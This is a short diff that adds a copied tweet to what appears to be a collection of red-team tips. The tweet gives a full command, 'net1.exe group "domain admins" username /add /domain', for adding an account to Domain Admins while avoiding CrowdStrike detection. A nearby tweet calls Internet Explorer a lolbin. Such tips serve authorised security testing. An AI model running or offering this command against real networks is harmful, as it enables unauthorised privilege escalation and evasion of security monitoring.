@@ -1,4 +1,14 @@
 *************************
+kevin
+@GuhnooPlusLinux
+·
+18h
+Red Teamers, are you tired of CrowdStrike catching your "net" command when adding yourself to the Domain Admins group? Try the following command instead:
+
+net1.exe group "domain admins" username /add /domain
+
+
+*************************
 ¬ whickey
 @notwhickey
 Have you ever considered Internet Explorer to be a #lolbin? 
